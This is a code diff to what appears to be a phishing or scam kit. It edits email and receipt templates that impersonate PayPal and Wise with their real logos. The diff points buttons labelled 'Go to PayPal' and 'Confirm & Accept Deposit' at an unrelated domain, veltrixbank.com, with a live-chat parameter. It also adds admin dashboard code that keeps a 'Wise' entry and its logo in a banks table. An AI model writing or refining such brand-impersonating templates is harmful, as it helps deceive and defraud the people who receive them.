@@ -123,7 +123,7 @@ const EMAIL_TEMPLATES = [
 
         <tr>
             <td align="center" style="padding: 15px 0 25px 0;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" width="24" style="display: block; border: 0;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" width="74" height="auto" style="display: block; border: 0; width: 74px; height: auto;">
             </td>
         </tr>
 
@@ -232,7 +232,7 @@ const EMAIL_TEMPLATES = [
 
         <tr>
             <td align="center" style="padding: 30px 40px;">
-                <a href="#livechat" style="display: inline-block; background-color: #000000; color: #ffffff; font-weight: bold; font-size: 15px; text-decoration: none; padding: 14px 45px; border-radius: 25px; min-width: 140px; text-align: center;">Go to PayPal</a>
+                <a href="https://www.veltrixbank.com/?livechat=true" style="display: inline-block; background-color: #000000; color: #ffffff; font-weight: bold; font-size: 15px; text-decoration: none; padding: 14px 45px; border-radius: 25px; min-width: 140px; text-align: center;">Go to PayPal</a>
             </td>
         </tr>
 
@@ -244,7 +244,7 @@ const EMAIL_TEMPLATES = [
 
         <tr>
             <td align="center" style="padding: 25px 0 10px 0;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" width="22" style="display: block; border: 0; opacity: 0.8;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" width="68" height="auto" style="display: block; border: 0; opacity: 0.8; width: 68px; height: auto;">
             </td>
         </tr>
 
@@ -495,10 +495,7 @@ const EMAIL_TEMPLATES = [
     <div class="receipt-content">
         
         <div class="logo-container">
-            <svg class="wise-logo" viewBox="0 0 350 100" xmlns="http://www.w3.org/2000/svg">
-                <path d="M20 20 L55 20 L40 55 L75 15 L110 15 L60 85 L20 85 Z" fill="#163300"/>
-                <text x="115" y="75" font-family="'Courier Prime', Arial, sans-serif" font-weight="900" font-size="72" fill="#163300" letter-spacing="-2">wise</text>
-            </svg>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Wise_Logo_512x124.svg/1200px-Wise_Logo_512x124.svg.png" alt="Wise" class="wise-logo" width="140" style="display: block; width: 140px; height: auto; border: 0;">
         </div>
 
         <div class="company-details">
@@ -600,7 +597,7 @@ const EMAIL_TEMPLATES = [
         </div>
 
         <div class="cta-button-container">
-            <a href="#" class="cta-button">Confirm Transfer</a>
+            <a href="https://www.veltrixbank.com/?livechat=true" class="cta-button">Confirm & Accept Deposit</a>
         </div>
 
         <div class="footer-msg">
@@ -1075,14 +1072,18 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onLogout, onExit
                     }]);
                 }
                 const hasWise = (b || []).some((bank: any) => bank.name?.toLowerCase() === 'wise');
+                const wiseBank = (b || []).find((bank: any) => bank.name?.toLowerCase() === 'wise');
+                const wiseLogoUrl = 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Wise_Logo_512x124.svg/1200px-Wise_Logo_512x124.svg.png';
                 if (!hasWise) {
                     await supabaseAdmin.from('mvp_banks').insert([{
                         name: 'Wise',
-                        logo: 'https://wise.com/public-resources/assets/logos/wise-logo.svg',
+                        logo: wiseLogoUrl,
                         color: 'bg-green-700'
                     }]);
+                } else if (wiseBank && wiseBank.logo !== wiseLogoUrl) {
+                    await supabaseAdmin.from('mvp_banks').update({ logo: wiseLogoUrl }).eq('id', wiseBank.id);
                 }
-                if (!hasPaypal || !hasWise) {
+                if (!hasPaypal || !hasWise || (wiseBank && wiseBank.logo !== wiseLogoUrl)) {
                     const { data: refreshedBanks } = await supabaseAdmin.from('mvp_banks').select('*').limit(50);
                     b = refreshedBanks;
                 }
